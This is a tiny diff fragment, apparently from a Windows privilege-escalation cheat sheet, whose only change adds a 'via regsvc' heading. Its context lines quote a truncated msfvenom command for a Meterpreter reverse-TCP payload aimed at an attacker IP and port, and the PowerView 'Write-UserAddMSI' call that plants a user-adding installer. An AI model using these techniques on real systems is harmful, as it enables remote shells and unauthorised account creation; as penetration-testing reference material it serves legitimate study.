@@ -256,6 +256,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport=[attacker 
 # Import as above
 Write-UserAddMSI
 ```
+### via regsvc
 
 ## Executables
 
